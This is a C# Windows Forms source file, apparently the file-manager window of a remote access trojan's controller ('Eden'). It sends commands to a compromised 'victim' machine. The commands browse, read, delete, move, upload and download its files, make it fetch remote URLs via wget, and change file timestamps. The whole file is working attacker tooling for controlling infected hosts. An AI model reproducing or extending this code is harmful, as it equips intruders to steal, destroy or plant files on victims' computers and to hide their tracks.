using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;

namespace Eden
{
    public partial class frmFileMgr : Form
    {
        /*
         * Todo:
         * Upload
         * Download
         * Archive
         * Datetime
         */

        public clsClient m_clnt;
        public clsVictim m_victim;
        public string szVictimID;

        private ImageList m_ilFileExt;

        private string szHomeDir;

        private List<stEntryTag> lsCopy = new List<stEntryTag>();

        public struct stEntryTag
        {
            public bool bDirectory;
            public string szFullName;
        }

        private struct stFileDeleteStatus
        {
            public string szFilename;
            public int nCode;
            public string szMsg;
        }

        private struct stWgetStatus
        {
            public string szUrl;
            public string szFilename;
            public int nCode;
            public string szMsg;
        }

        public frmFileMgr(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;

            m_ilFileExt = new ImageList();
            m_ilFileExt.ImageSize = new Size(25, 25);
            m_ilFileExt.ColorDepth = ColorDepth.Depth32Bit;
        }

        void Received(clsClient clnt, string szVictimID, string[] aMsg)
        {
            try
            {
                if (szVictimID != this.szVictimID)
                    return;

                if (aMsg[0] == "file")
                {
                    if (aMsg[1] == "init") //Initialization.
                    {
                        string szDir = aMsg[2];

                        Invoke(new Action(() =>
                        {
                            textBox1.Text = szDir;
                            textBox1.Tag = szDir;
                            szHomeDir = szDir;

                            TreeNode tn = AddTreeNodeWithFullPath(treeView1, $"/{szDir.Replace("/", "\\")}");

                            treeView1.SelectedNode = tn;
                        }));
                    }
                    else if (aMsg[1] == "ls") //List dir.
                    {
                        string szDirPath = aMsg[2];
                        if (!string.Equals(szDirPath, fnGetCurrentDir()))
                            return;

                        string szJsonPayload = aMsg[3];

                        List<ListViewItem> lsDir = new List<ListViewItem>();
                        List<ListViewItem> lsFile = new List<ListViewItem>();

                        foreach (string szJson in clsTools.EZData.String2OneDList(szJsonPayload))
                        {
                            Dictionary<string, JsonElement> dic = clsTools.EZData.JsonStr2Dic(szJson);

                            string szName = dic["Name"].GetString();
                            bool bIsDir = szName[0] == '/';

                            //Key of dictionary "dic"
                            string[] aKeys =
                            {
                                "Size",
                                "Permission",
                                "CreateDate",
                                "LastModified",
                                "LastAccessed",
                            };

                            //Name: Dictionary: /dirname, File: filename.
                            ListViewItem item = new ListViewItem(bIsDir ? new string(szName.Skip(1).ToArray()) : szName);
                            item.SubItems.AddRange(
                                aKeys.Select(x => new ListViewItem.ListViewSubItem()
                                {
                                    Text = dic[x].ToString(),
                                })
                                .ToArray()
                            );
                            item.Tag = new stEntryTag()
                            {
                                bDirectory = bIsDir,
                                szFullName = $"{szDirPath}/{item.Text}",
                            };

                            if (bIsDir)
                            {
                                item.ImageKey = "folder";
                            }
                            else
                            {
                                string szFileExt = Path.GetExtension(item.Text).Replace(".", string.Empty);
                                if (!m_ilFileExt.Images.ContainsKey(szFileExt))
                                {
                                    string szTempFilePath = Path.GetTempFileName();
                                    string szExtTemp = szTempFilePath + "." + szFileExt;

                                    File.WriteAllText(szExtTemp, string.Empty);
                                    Icon icon = Icon.ExtractAssociatedIcon(szExtTemp);

                                    m_ilFileExt.Images.Add(icon);
                                    m_ilFileExt.Images.SetKeyName(m_ilFileExt.Images.Count - 1, szFileExt);

                                    File.Delete(szExtTemp);
                                    File.Delete(szTempFilePath);
                                }

                                item.ImageKey = szFileExt;
                            }

                            //Classify listview items.
                            if (bIsDir)
                                lsDir.Add(item);
                            else
                                lsFile.Add(item);
                        }

                        Invoke(new Action(() =>
                        {
                            listView1.Items.AddRange(lsDir.Concat(lsFile).Where(x => listView1.FindItemWithText(x.Text) == null).ToArray());

                            //Process lsDir and add them in treeview.
                            TreeNode currentNode = tnFindTreeNodeFromTreeView(treeView1.Nodes, szDirPath);
                            if (currentNode == null)
                            {
                                MessageBox.Show("currentNode is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                return;
                            }

                            lsDir = lsDir.Where(x => tnFindTreeNodeFromTreeView(treeView1.Nodes, $"{fnGetCurrentDir()}/{x.Text}") == null).ToList();

                            if (currentNode.Nodes.Count == 0)
                                currentNode.Nodes.AddRange(lsDir.Select(x => new TreeNode(x.Text) { ImageKey = "folder" }).ToArray());
                            else
                            {
                                foreach (ListViewItem item in lsDir)
                                {
                                    TreeNode node = new TreeNode(item.Text);
                                    node.ImageKey = item.Text == "/" ? "drive" : "folder";
                                    bool bAdd = false;
                                    for (int i = 0; i < currentNode.Nodes.Count; i++)
                                    {
                                        if (string.Compare(currentNode.Nodes[i].Text, node.Text) > 0)
                                        {
                                            currentNode.Nodes.Insert(i, node);
                                            bAdd = true;
                                            break;
                                        }
                                    }

                                    if (!bAdd)
                                    {
                                        currentNode.Nodes.Add(node);
                                    }
                                }
                            }

                            treeView1.ExpandAll();
                            toolStripStatusLabel1.Text = $"Action successfulyl, Folder[{lsDir.Count}], File[{lsFile.Count}]";
                        }));
                    }
                    else if (aMsg[1] == "read")
                    {
                        string szPayload = aMsg[2];
                        List<List<string>> lsResults = clsTools.EZData.String2TwoDList(szPayload);

                        foreach (var lsResult in lsResults)
                        {
                            string szFilename = lsResult[0];
                            string szContent = lsResult[1];

                            ShowReadFile(szFilename, szContent);
                        }
                    }
                    else if (aMsg[1] == "write")
                    {
                        int code = int.Parse(aMsg[2]);
                        if (code == 0)
                        {
                            MessageBox.Show(aMsg[3], "Write error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                    else if (aMsg[1] == "del")
                    {
                        List<List<string>> lsResult = clsTools.EZData.String2TwoDList(aMsg[2]);
                        List<stFileDeleteStatus> ls = new List<stFileDeleteStatus>();

                        foreach (var obj in lsResult)
                        {
                            stFileDeleteStatus st = new stFileDeleteStatus()
                            {
                                szFilename = obj[0],
                                nCode = int.Parse(obj[1]),
                                szMsg = obj[2],
                            };

                            ls.Add(st);
                        }

                        ShowDeleteFile(ls);

                        LvRefresh();
                    }
                    else if (aMsg[1] == "uf")
                    {

                    }
                    else if (aMsg[1] == "df")
                    {

                    }
                    else if (aMsg[1] == "touch")
                    {

                    }
                    else if (aMsg[1] == "wget")
                    {
                        List<List<string>> lsResults = clsTools.EZData.String2TwoDList(aMsg[2]);
                        List<stWgetStatus> ls = new List<stWgetStatus>();
                        foreach (var result in lsResults)
                        {
                            stWgetStatus st = new stWgetStatus()
                            {
                                szUrl = result[0],
                                szFilename = result[1],
                                nCode = int.Parse(result[2]),
                                szMsg = result[3],
                            };

                            ls.Add(st);
                        }

                        ShowWget(ls);

                        LvRefresh();
                    }
                    else if (aMsg[1] == "new")
                    {
                        if (aMsg[2] == "d")
                        {
                            string szDirName = EZCrypto.Encoder.b64d2str(aMsg[3]);
                            int nCode = int.Parse(aMsg[4]);

                            if (nCode == 1)
                            {
                                MessageBox.Show("Add directory successfully:\n" + szDirName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                        }
                    }
                    else if (aMsg[1] == "goto")
                    {
                        Invoke(new Action(() =>
                        {
                            string szDirName = aMsg[2];
                            int nCode = int.Parse(aMsg[3]);

                            if (nCode == 0)
                            {
                                MessageBox.Show("Path not found: " + szDirName, "Not found", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                textBox1.Text = fnGetCurrentDir();

                                return;
                            }

                            textBox1.Text = szDirName;
                            textBox1.Tag = szDirName;

                            TreeNode tn = tnFindTreeNodeFromTreeView(treeView1.Nodes, szDirName);
                            if (tn == null)
                                tn = AddTreeNodeWithFullPath(treeView1, "/" + szDirName.Replace("/", "\\"));

                            treeView1.SelectedNode = tn;
                        }));
                    }
                    else if (aMsg[1] == "error")
                    {
                        MessageBox.Show(aMsg[2], aMsg[3], MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name);
            }
        }

        private TreeNode tnFindTreeNodeFromTreeView(TreeNodeCollection aTreeNodes, string szFullPath, StringComparison method = StringComparison.OrdinalIgnoreCase)
        {
            string Convert2LinuxPath(string szNodePath) => szNodePath.Replace("\\", "/").Replace("///", "/").Replace("//", "/");

            var foundNode = aTreeNodes.Cast<TreeNode>().FirstOrDefault(tn => string.Equals(Convert2LinuxPath(tn.FullPath), szFullPath, method));
            if (null == foundNode)
            {
                foreach (var childNode in aTreeNodes.Cast<TreeNode>())
                {
                    var foundChildNode = tnFindTreeNodeFromTreeView(childNode.Nodes, szFullPath, method);
                    if (null != foundChildNode)
                    {
                        return foundChildNode;
                    }
                }
            }

            return foundNode;
        }

        private TreeNode AddTreeNodeWithFullPath(TreeView tv, string szFullPath, TreeNode tn = null)
        {
            string[] aDir = szFullPath.Split('\\');
            if (aDir.Length > 0 && !string.IsNullOrEmpty(aDir[0]))
            {
                foreach (TreeNode node in tn == null ? tv.Nodes : tn.Nodes)
                {
                    if (node.Text == aDir[0])
                    {
                        tn = node;
                        return AddTreeNodeWithFullPath(tv, string.Join("\\", aDir[1..]), tn);
                    }
                }

                if (tn == null)
                {
                    tn = new TreeNode(aDir[0]);
                    tn.ImageKey = tn.Text == "/" ? "drive" : "folder";
                    tv.Nodes.Add(tn);
                }
                else
                {
                    TreeNode subNode = new TreeNode(aDir[0]);
                    subNode.ImageKey = subNode.Text == "/" ? "drive" : "folder";
                    tn.Nodes.Add(subNode);
                    tn = subNode;
                    tn.EnsureVisible();
                }

                string szNewPath = string.Join("\\", aDir[1..]);
                return AddTreeNodeWithFullPath(tv, szNewPath, tn);
            }

            treeView1.ExpandAll();

            return tn;
        }

        private void SendReadFile(string szFilename)
        {
            //m_clnt.SendVictim(szVictimID, $"File|read|{szFilename}");
            m_victim.fnSendCommand($"File|read|{szFilename}");
        }
        private void SendReadFile(List<string> lsFiles, bool bSendAll = true)
        {
            if (bSendAll)
            {
                //m_clnt.SendVictim(szVictimID, $"File|read|" + string.Join("|", lsFiles));
                m_victim.fnSendCommand($"File|read|" + string.Join("|", lsFiles));
            }
            else
            {
                //Send payload one by one.
                foreach (string szFilename in lsFiles)
                    SendReadFile(szFilename);
            }
        }
        private void ShowReadFile(string szFilename, string szContent)
        {
            Invoke(new Action(() =>
            {
                frmFileEditor f = clsTools.FindForm<frmFileEditor>(szVictimID);
                if (f == null)
                {
                    f = new frmFileEditor();
                    f.m_szVictimID = szVictimID;

                    f.Show();
                }

                f.ShowFileContent(szFilename, szContent);
            }));
        }

        private List<string> GetDeleteFilesFromSelectedItems()
        {
            List<string> lsFiles = new List<string>();
            Invoke(new Action(() =>
            {
                foreach (ListViewItem item in listView1.SelectedItems)
                {
                    var st = (stEntryTag)item.Tag;
                    lsFiles.Add(st.szFullName + (st.bDirectory ? "/" : string.Empty));
                }
            }));

            return lsFiles;
        }
        private void SendDeleteFile(string szFile)
        {
            m_clnt.SendVictim(szVictimID, $"File|del|{szFile}");
        }
        private void SendDeleteFile(List<string> lsFiles, bool bSendAll = true, bool bShowWindow = true)
        {
            if (bShowWindow)
            {
                string[] aCols = { "Filename", "Status" };

                frmListViewItem f = new frmListViewItem();
                f.m_aCols = aCols;
                f.m_aItemText = lsFiles.ToArray();
                f.szVictimID = szVictimID;

                f.Show();
            }

            if (bSendAll)
            {
                m_clnt.SendVictim(szVictimID, $"File|del|{string.Join("|", lsFiles)}");
            }
            else
            {
                foreach (string szFile in lsFiles)
                    SendDeleteFile(szFile);
            }
        }
        private void ShowDeleteFile(List<stFileDeleteStatus> lsFiles)
        {
            Invoke(new Action(() =>
            {
                frmListViewItem f = clsTools.FindForm<frmListViewItem>(szVictimID);
                if (f != null)
                {
                    foreach (var st in lsFiles)
                    {
                        f.UpdateStatus(st.szFilename, st.szMsg);
                    }
                }
            }));
        }

        public void SendWget(string szUrl)
        {
            m_clnt.SendVictim(szVictimID, "File|wget|" + szUrl);
        }
        public void SendWget(List<string> lsUrls, bool bOnebyOne = false, bool bShowWindow = true)
        {
            if (bShowWindow)
            {
                string[] alpCols = { "Url", "Filename", "Message" };
                frmListViewItem f = new frmListViewItem();
                f.m_aCols = alpCols;
                f.szVictimID = szVictimID;
                f.m_aItemText = lsUrls.ToArray();

                f.Show();
            }

            if (bOnebyOne)
            {
                foreach (string szUrl in lsUrls)
                    SendWget(szUrl);
            }
            else
            {
                m_clnt.SendVictim(szVictimID, "File|wget|" + string.Join("|", lsUrls));
            }
        }
        private void ShowWget(List<stWgetStatus> lsWgets)
        {
            Invoke(new Action(() =>
            {
                frmListViewItem f = clsTools.FindForm<frmListViewItem>(szVictimID);
                if (f != null)
                {
                    foreach (var st in lsWgets)
                    {
                        f.UpdateStatus(st.szUrl, st.szFilename, st.szMsg);
                    }
                }
            }));
        }

        private string fnGetCurrentDir()
        {
            string szDir = string.Empty;
            Invoke(new Action(() => szDir = textBox1.Tag.ToString()));

            return szDir;
        }

        private void SendGoto(string szDirName)
        {
            m_clnt.SendVictim(szVictimID, "File|goto|" + szDirName);
        }

        private void SendPaste(List<stEntryTag> lsEntry, bool bMove = false)
        {
            string[] aEntry = lsEntry.Select(x => x.bDirectory ? $"{x.szFullName}/" : x.szFullName).ToArray();

            frmListViewItem f = new frmListViewItem();
            f.m_aCols = new string[] { "Name", "Status" };
            f.m_aItemText = aEntry;
            f.Show();

            m_clnt.SendVictim(szVictimID, $"File|paste|{(bMove ? "1" : "0")}|{clsTools.EZData.OneDList2String(aEntry.ToList())}|{fnGetCurrentDir()}");
        }

        private void LvRefresh()
        {
            Invoke(new Action(() =>
            {
                TreeNode node = treeView1.SelectedNode ?? tnFindTreeNodeFromTreeView(treeView1.Nodes, fnGetCurrentDir());
                if (node == null)
                {
                    MessageBox.Show("Variable \"node\" is null.", "Null", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                treeView1.SelectedNode = null;
                treeView1.SelectedNode = node;
            }));
        }

        stEntryTag fnGetEntryTag(ListViewItem item) => (stEntryTag)item.Tag;

        void setup()
        {
            if (m_clnt == null)
            {
                MessageBox.Show("m_clnt is null");
                Close();
                return;
            }

            toolStripStatusLabel1.Text = "Loading...";

            m_ilFileExt.Images.Add(fileImageList.Images["folder"]);
            m_ilFileExt.Images.SetKeyName(m_ilFileExt.Images.Count - 1, "folder");

            //ListView
            listView1.View = View.Details;
            listView1.SmallImageList = m_ilFileExt;

            string[] aCols = { "Name", "Size", "Permission", "CreateDate", "LastModified", "LastAccessed" };
            foreach (string szCol in aCols)
            {
                ColumnHeader header = new ColumnHeader();
                header.Text = szCol;
                header.Width = 150;

                listView1.Columns.Add(header);
            }

            m_clnt.ServerMessageReceived += Received;
            m_clnt.SendVictim(szVictimID, @$"File|init");
        }

        private void frmFileMgr_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            treeView1.SelectedImageKey = treeView1.SelectedNode.ImageKey;

            toolStripStatusLabel1.Text = "Loading...";

            listView1.Items.Clear();

            string szDirPath = treeView1.SelectedNode.FullPath;
            string szLinuxPath = $"/{szDirPath.Replace("\\", "/")}".Replace("///", "/").Replace("//", "/");

            textBox1.Text = szLinuxPath;
            textBox1.Tag = szLinuxPath;

            int nMaxFolder = 100;
            int nMaxFile = 100;

            m_clnt.SendVictim(szVictimID, $"File|ls|{szLinuxPath}|{nMaxFolder}|{nMaxFile}");
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            ListViewItem[] items = listView1.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            var stFile = (stEntryTag)items[0].Tag;
            if (stFile.bDirectory)
            {
                TreeNode tn = tnFindTreeNodeFromTreeView(treeView1.Nodes, stFile.szFullName);
                treeView1.SelectedNode = tn;
                return;
            }

            SendReadFile(stFile.szFullName);
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            List<string> lsFiles = new List<string>();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                var stFiles = (stEntryTag)item.Tag;
                if (stFiles.bDirectory)
                    continue;

                lsFiles.Add(stFiles.szFullName);
            }

            SendReadFile(lsFiles);
        }

        private void frmFileMgr_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_clnt.ServerMessageReceived -= Received;
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                SendGoto(textBox1.Text);
            }
        }

        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {

            }
            else
            {
                if (e.KeyCode == Keys.F5)
                {
                    LvRefresh();
                }
                else if (e.KeyCode == Keys.Delete)
                {
                    SendDeleteFile(GetDeleteFilesFromSelectedItems());
                }
            }
        }

        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            SendDeleteFile(GetDeleteFilesFromSelectedItems());
        }

        //Refresh
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            LvRefresh();
        }
        //Home
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            treeView1.SelectedNode = tnFindTreeNodeFromTreeView(treeView1.Nodes, szHomeDir);
        }
        //Parent
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            treeView1.SelectedNode = treeView1.SelectedNode?.Parent;
        }

        //Copy
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            lsCopy.Clear();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                stEntryTag tag = (stEntryTag)item.Tag;
                lsCopy.Add(tag);
            }
        }
        //Move
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            if (lsCopy.Count > 0)
            {
                SendPaste(lsCopy, true);
            }
        }
        //Paste
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            if (lsCopy.Count > 0)
            {
                SendPaste(lsCopy);
            }
        }
        //Rename
        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            ListViewItem[] items = listView1.SelectedItems.Cast<ListViewItem>().ToArray();
            if (items.Length == 0)
                return;

            var tag = (stEntryTag)items[0].Tag;

            frmFileRename f = new frmFileRename();
            f.m_szEntryName = tag.szFullName;
            f.m_bDirectory = tag.bDirectory;
            f.m_clnt = m_clnt;
            f.szVictimID = szVictimID;

            f.ShowDialog();
        }
        //WGET
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            frmFileWGET f = new frmFileWGET();
            f.m_fMgr = this;

            f.Show();
        }
        //Upload
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = true;

            if (ofd.ShowDialog() == DialogResult.OK)
            {
                List<string> lszFilePath = ofd.FileNames.ToList();
                frmFileTransfer f = new frmFileTransfer(m_victim, fnGetCurrentDir(), lszFilePath, TransferFileType.UploadFile);
                f.Show();
            }
        }
        //Download
        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            List<ListViewItem> lItems = listView1.SelectedItems.Cast<ListViewItem>().ToList();
            List<string> lFile = new List<string>();
            bool bContainDir = false;
            foreach (ListViewItem item in lItems)
            {
                var tag = fnGetEntryTag(item);
                bContainDir = bContainDir || tag.bDirectory;

                if (tag.bDirectory)
                    continue;

                lFile.Add(tag.szFullName);
            }

            if (bContainDir)
            {
                MessageBox.Show(
                    "Target entries contain directory, current not support, the trasfer task will ignore them.\n" +
                    "If you want to do directory transfer, please compress them into archive file and then transfer it.",
                    "Exists Directory",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Warning
                );
            }

            frmFileTransfer f = new frmFileTransfer(m_victim, fnGetCurrentDir(), lFile, TransferFileType.DownloadFile);
            f.Show();
        }
        //New - Folder
        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            frmFileAddDir f = new frmFileAddDir(m_clnt, szVictimID);
            f.ShowDialog();
        }
        //New - File
        private void toolStripMenuItem13_Click(object sender, EventArgs e)
        {
            frmFileEditor f = new frmFileEditor();
            f.m_szVictimID = szVictimID;
            f.m_clnt = m_clnt;

            f.Show();

            f.ShowFileContent(fnGetCurrentDir() + "/NewFile_" + clsTools.GetFileNameFromDatetime("txt"), string.Empty);
        }
        //Image - Selected
        private void toolStripMenuItem14_Click(object sender, EventArgs e)
        {
            List<string> lsImgFilename = new List<string>();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                var st = (stEntryTag)item.Tag;
                if (!st.bDirectory && clsTools.IsImageFilename(st.szFullName))
                    lsImgFilename.Add(st.szFullName);
            }

            frmFileImage f = clsTools.FindForm<frmFileImage>(szVictimID);
            if (f == null)
            {
                f = new frmFileImage(lsImgFilename);

                f.m_szVictimID = szVictimID;
                f.m_clnt = m_clnt;
                f.m_lsImgFilename = lsImgFilename;
            }

            f.Show();
        }
        //Image - All
        private void toolStripMenuItem15_Click(object sender, EventArgs e)
        {
            List<string> lsImgFilename = new List<string>();
            foreach (ListViewItem item in listView1.Items)
            {
                var st = (stEntryTag)item.Tag;
                if (!st.bDirectory && clsTools.IsImageFilename(st.szFullName))
                    lsImgFilename.Add(st.szFullName);
            }

            frmFileImage f = clsTools.FindForm<frmFileImage>(szVictimID);
            if (f == null)
            {
                f = new frmFileImage(lsImgFilename);

                f.m_szVictimID = szVictimID;
                f.m_clnt = m_clnt;
                f.m_lsImgFilename = lsImgFilename;
            }

            f.Show();
        }

        private void toolStripMenuItem16_Click(object sender, EventArgs e)
        {

        }
        //Archive - Compress
        private void toolStripMenuItem18_Click(object sender, EventArgs e)
        {
            var lEntry = listView1.SelectedItems.Cast<ListViewItem>().Select(x => fnGetEntryTag(x)).ToList();

            frmFileArchive f = new frmFileArchive(m_victim, lEntry, true);
            f.Show();
        }
        //Archive - Extract
        private void toolStripMenuItem19_Click(object sender, EventArgs e)
        {
            var lEntry = listView1.SelectedItems.Cast<ListViewItem>().Select(x => fnGetEntryTag(x)).ToList();

            frmFileArchive f = new frmFileArchive(m_victim, lEntry, true);
            f.Show();
        }
        //Datetime
        private void toolStripMenuItem17_Click(object sender, EventArgs e)
        {
            var lEntry = listView1.SelectedItems.Cast<ListViewItem>().Select(x => fnGetEntryTag(x)).ToList();
            if (lEntry.Count == 0)
                return;

            frmFileDatetime f = new frmFileDatetime(m_victim, lEntry[0]);
            f.ShowDialog();

            LvRefresh();
        }
    }
}
